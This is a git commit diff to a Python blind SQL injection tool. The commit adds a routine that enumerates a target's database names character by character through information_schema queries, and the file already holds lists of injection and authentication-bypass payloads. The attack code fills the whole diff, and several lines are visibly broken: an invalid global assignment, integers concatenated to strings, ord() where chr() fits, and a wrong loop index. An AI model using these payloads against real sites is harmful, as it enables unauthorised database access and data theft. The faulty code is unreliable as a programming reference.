c60aab1e2bee0ac845665a8bd9551ce31776400e
pPailleux <pailleux.pierre@gmail.com>
2017-04-15 17:55:44 +0200

    Added database enumeration, todo test

--- sql.py
+++ sql.py
@@ -9,6 +9,7 @@ import urllib2, requests
 from optparse import OptionParser
 
 # --------- Global variables ----------
+global l_database_name = []
 global l_injnum = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2", "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x'='p'#"]
 global l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2", "' and '1'='2'--", "1/* comment */"]
 global l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
@@ -67,11 +68,14 @@ def enum_columns(url, bypass):
 def sql_version(url, bypass):
     for sql_version in range(4,7):
         # uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
+
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
         server_response = request_handler(uri)
         server_response_status = validate_request(server_response)
+
         if server_response_status is False:
             server_version = sql_version - 1
+
             if server_version == 4:
                 print "SQL version 4 detected... Not yet supported!"
                 sys.exit()
@@ -80,11 +84,58 @@ def sql_version(url, bypass):
 
 # --------- Enumerate databases ----------
 def eunum_databases(url, bypass):
-    # ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
-    # TODO Find out how many databases by playing with limit
-    database_increment = 1
-    while True:
-    pass
+    '''
+        Request working on leettime
+        Is the base request for finding the number of databases, how many characters are in each database name
+        ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
+        TODO Find out how many databases by playing with limit
+    '''
+    database_increment = 0
+
+    # Count how many databases, we assume there are less than 64 databases
+    while (database_increment < 64):
+        uri = url + "' and substring((select schema_name from information_schema.schemata limit " + database_increment + ",1),1,1)>=0" + bypass
+        server_response = request_handler(uri)
+        server_response_status = validate_request(server_response)
+
+        # If status is false then we know the number of databases
+        if server_response_status is False:
+            print 'Found ' + database_increment + 'Databases'
+
+            # Count how many letters in each database name
+            for database_number in range(0,database_increment):
+                database_letter_count = 1
+
+                # Count how many chars in db name, we assume the database name to be less than 128 characters
+                while (database_letter_count < 128):
+                    uri = url + "' and substring((select schema_name from information_schema.schemata limit " + database_number + ",1),"+ database_letter_count + ",1)>0" + bypass
+                    server_response = request_handler(uri)
+                    server_response_status = validate_request(server_response)
+
+                    if server_response_status is False:
+                        print 'Database' + database_number + ': has ' + database_letter_count + 'letters'
+                        database_name = ""
+
+                        # Get the databases names
+                        for letter_count in range(1,database_letter_count):
+
+                            # Loop in ascii range to guess each character
+                            for database_letter in range(1,128):
+                                uri = url + "' and substring((select schema_name from information_schema.schemata limit " + database_number + ",1)," + database_letter_count + ",1)>=" + database_letter + bypass
+                                server_response = request_handler(uri)
+                                server_response_status = validate_request(server_response)
+
+                                # If status is false then database_letter - 1 was the n-th char of the database name
+                                if server_response_status is False:
+                                    database_name = database_name + str(ord(database_letter - 1))
+
+                    elif server_response_status is True:
+                        database_letter_count = database_letter_count + 1
+
+                l_database_name += database_name
+
+        elif server_response_status is True:
+            database_increment = database_increment + 1
 
 # --------- Enumerate database tables ----------
 def enum_tables(url, bypass, database):
